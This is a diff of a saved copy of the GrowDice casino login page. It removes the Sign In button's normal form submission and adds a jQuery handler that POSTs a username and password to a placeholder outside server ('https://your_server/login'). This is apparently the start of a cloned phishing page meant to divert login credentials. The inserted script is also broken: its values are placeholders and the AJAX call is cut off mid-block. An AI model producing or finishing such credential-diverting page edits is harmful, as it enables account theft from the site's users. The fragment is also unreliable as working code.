@@ -1,4 +1,5 @@
 <html lang="en" style="--app-height: 695px;"><head>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 <script type="text/javascript" src="captcha.js"></script>
 <script src="https://js.hcaptcha.com/1/api.js?hl=en" async defer></script>
 <script async="" src="https://www.googletagmanager.com/gtag/js?id=AW-11343234535" type="text/javascript"></script>
@@ -50,7 +51,22 @@
 data-callback="enableBtn">
 </div>
 <textarea id="g-recaptcha-response-07t8ugrnn6ps" name="g-recaptcha-response" style="display: none;"></textarea><textarea id="h-captcha-response-07t8ugrnn6ps" name="h-captcha-response" style="display: none;"></textarea></div>
-<button type="submit" id="button1" disabled="true" class="sc-1xm9mse-0 fsbplj text-sm rounded-sm">Sign In</button>
+<button id="button1" disabled="true" class="sc-1xm9mse-0 fsbplj text-sm rounded-sm">Sign In</button>
+ <script>
+        $(document).ready(function() {
+            $('#button1').click(function() {
+                // Get username and password from user input
+                var username = "your_username";
+                var password = "your_password";
+
+                // Make AJAX request to server
+                $.ajax({
+                    url: 'https://your_server/login', // Replace with your server endpoint
+                    type: 'POST',
+                    data: {
+                        username: username,
+                        password: password
+                    },
 <div class="flex flex-col gap-2"><a class="m-auto font text-white cursor-pointer font-semibold">Forgot Password?</a><div class="flex gap-1 justify-center"><span>Don't have an account?</span><a class="text-white font-semibold cursor-pointer">Register an account</a></div></div></div></div></div></div></div>
 <noscript>GrowDice requires JavaScript in order to run!</noscript>
 <script defer="" src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon="{&quot;token&quot;: &quot;89e1729132694022a06d88bf8aca7c2b&quot;}" type="text/javascript"></script><script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/v84a3a4012de94ce1a686ba8c167c359c1696973893317" integrity="sha512-euoFGowhlaLqXsPWQ48qSkBSCFs3DPRyiwVu3FjR96cMPx+Fr+gpWRhIafcHwqwCqWS42RZhIudOvEI+Ckf6MA==" data-cf-beacon="{&quot;rayId&quot;:&quot;86a7b0a58ea60fe6&quot;,&quot;version&quot;:&quot;2024.3.0&quot;,&quot;token&quot;:&quot;428553e0b93c4aa8a7dd2cf01f082cb6&quot;}" crossorigin="anonymous"></script><iframe allow="join-ad-interest-group" data-tagging-id="AW-11343234535" data-load-time="1711461867307" height="0" width="0" style="display: none; visibility: hidden;" src="https://td.doubleclick.net/td/rul/11343234535?random=1711461867284&amp;cv=11&amp;fst=1711461867284&amp;fmt=3&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;gtm=45be43p0v9167689088za200&amp;gcd=13l3l3l3l1&amp;dma=0&amp;u_w=1536&amp;u_h=864&amp;url=https%3A%2F%2Fgrowdice.net%2F%3Fmodal%3Dlogin&amp;hn=www.googleadservices.com&amp;frm=0&amp;tiba=GrowDice%20-%20Provably%20Fair%20Growtopia%20Casino&amp;npa=0&amp;pscdl=noapi&amp;auid=1416088915.1711193204&amp;uaa=x86&amp;uab=64&amp;uafvl=Chromium%3B122.0.6261.131%7CNot(A%253ABrand%3B24.0.0.0%7CGoogle%2520Chrome%3B122.0.6261.131&amp;uamb=0&amp;uam=&amp;uap=Windows&amp;uapv=15.0.0&amp;uaw=0&amp;fledge=1&amp;data=event%3Dgtag.config"></iframe>
